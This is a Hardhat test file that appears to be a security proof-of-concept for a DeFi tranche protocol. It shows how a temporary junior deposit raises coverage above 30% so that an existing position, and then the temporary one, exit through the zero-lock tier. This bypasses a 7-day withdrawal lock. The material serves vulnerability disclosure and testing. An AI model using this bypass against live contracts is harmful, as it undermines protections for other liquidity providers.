import { HardhatProvider } from 'dequanto/hardhat/HardhatProvider';
import { UTest } from 'atma-utest';
import { $erc20 } from '../utils/$erc20';
import { $tranche } from '../utils/$tranche';
import { $hh } from '../utils/$hh';
import { $require } from 'dequanto/utils/$require';
import { $bigint } from 'dequanto/utils/$bigint';
import { $erc4626 } from '../utils/$erc4626';
import { $exitMode } from '@s/utils/$exitMode';

/**
 * Transient JRT coverage bypass PoC.
 *
 * Saturn-shaped production parameters:
 *   coverage <= 15%: 21 day JRT share lock, 0 bps
 *   15% < coverage <= 30%: 7 day JRT share lock, 10 bps
 *   coverage > 30%: immediate exit, 20 bps
 *   minimum JRT/SRT ratio: 7.5%
 *
 * The strategy is intentionally not mocked here. The PoC targets the generic
 * StrataCDO/Tranche/SharesCooldown classification logic: temporary Junior NAV
 * is counted by coverage(), can select the zero-lock tier, and can then be
 * withdrawn again because each redemption re-evaluates only instantaneous
 * coverage and maxWithdraw() enforces only the lower hard ratio.
 */

let hh = new HardhatProvider();
let attacker = await hh.deployer(1);
let liquidityProvider = await hh.deployer(2);

let {
    jrtVault,
    srtVault,
    sharesCooldown,
    accounting,
    cdo,
    USDe,
} = await $hh.test.deploy({ initialDeposit: false });

let { configManager } = await $hh.test.factory.ensureConfigManager();
let { deployer } = $hh.test;

await $erc20.mint(USDe, deployer, attacker, 1_000);
await $erc20.mint(USDe, deployer, liquidityProvider, 5_000);

// Saturn hard withdrawal floor / deposit buffer.
await accounting.$receipt().setMinimumJrtSrtRatioBuffer(deployer, $bigint.toWei(0.08));
await accounting.$receipt().setMinimumJrtSrtRatio(deployer, $bigint.toWei(0.075));

await $hh.test.factory.addRoles({
    [cdo.address]: [
        await sharesCooldown.COOLDOWN_WORKER_ROLE()
    ]
});

// Exact Saturn JRT exit tiers from src/platforms/strats/SaturnTranche.ts.
await $exitMode.set(sharesCooldown, configManager, jrtVault.address, [
    { covPct: 15, feeBps: 0,  lock: '21days' },
    { covPct: 30, feeBps: 10, lock: '7days'  },
    { covPct: 0,  feeBps: 20, lock: 0        },
]);

// Initial pool: 230 JRT / 1000 SRT = 23% coverage, inside the protected 7-day tier.
// Attacker owns 25 of the existing JRT; the rest belongs to an unrelated LP.
await $tranche.deposit(jrtVault, liquidityProvider, USDe, 205.0);
await $tranche.deposit(jrtVault, attacker, USDe, 25.0);
await $tranche.deposit(srtVault, liquidityProvider, USDe, 1000.0);

await $hh.test.snapshot('transient-coverage-bypass');

UTest.create({
    async $after () {
        await $hh.test.reset();
    },
    async $teardown () {
        await $hh.test.reset('transient-coverage-bypass');
    },

    async 'control: 23% coverage forces the existing JRT into the 7-day SharesCooldown' () {
        let coverage = Number(await cdo.coverage());
        $require.gt(coverage, 229_900);
        $require.lt(coverage, 230_100);

        let oldShares = await jrtVault.balanceOf(attacker.address);
        let cooldownBefore = await jrtVault.balanceOf(sharesCooldown.address);

        let assetsNow = await $erc4626.redeem(jrtVault, attacker, oldShares);

        // Protected-tier redemption does not remove strategy assets now; shares are escrowed.
        $require.eq(assetsNow, 0n);
        $require.eq(await jrtVault.balanceOf(attacker.address), 0n);
        $require.gt(await jrtVault.balanceOf(sharesCooldown.address), cooldownBefore);
    },

    async 'attack: temporary JRT raises coverage above 30%, lets both withdrawals execute, then coverage falls back below 30%' () {
        let coverageBefore = Number(await cdo.coverage());
        $require.gt(coverageBefore, 229_900);
        $require.lt(coverageBefore, 230_100);

        let oldShares = await jrtVault.balanceOf(attacker.address);
        let cooldownBefore = await jrtVault.balanceOf(sharesCooldown.address);

        // Temporary recapitalization: 230 + 100 JRT against 1000 SRT => 33% coverage.
        await $tranche.deposit(jrtVault, attacker, USDe, 100.0);
        let coverageBoosted = Number(await cdo.coverage());
        $require.gt(coverageBoosted, 300_000);

        // Exit the pre-existing position under the zero-lock tier.
        let oldAssetsOut = await $erc4626.redeem(jrtVault, attacker, oldShares);
        $require.gt(oldAssetsOut, 0n);

        // The temporary capital still keeps instantaneous coverage >30%, so it also
        // receives the zero-lock tier on the second, independent redemption.
        let coverageAfterOldExit = Number(await cdo.coverage());
        $require.gt(coverageAfterOldExit, 300_000);

        let temporaryShares = await jrtVault.balanceOf(attacker.address);
        $require.gt(temporaryShares, 0n);

        let temporaryAssetsOut = await $erc4626.redeem(jrtVault, attacker, temporaryShares);
        $require.gt(temporaryAssetsOut, 0n);

        // Nothing was placed into the JRT SharesCooldown in either withdrawal.
        $require.eq(await jrtVault.balanceOf(attacker.address), 0n);
        $require.eq(await jrtVault.balanceOf(sharesCooldown.address), cooldownBefore);

        // Once the temporary JRT is gone, coverage is back in the tier that should
        // require a 7-day lock. The relaxed tier existed only during the attack.
        let coverageAfterAttack = Number(await cdo.coverage());
        $require.gt(coverageAfterAttack, 150_000);
        $require.lt(coverageAfterAttack, 300_000);

        // Both redemptions paid only the configured immediate-exit fee; the attacker
        // recovered almost all of the 125 base-asset value without serving the lock.
        let totalAssetsOut = oldAssetsOut + temporaryAssetsOut;
        $require.gt(totalAssetsOut, $bigint.toWei(124.0));
        $require.lt(totalAssetsOut, $bigint.toWei(125.0));
    }
});
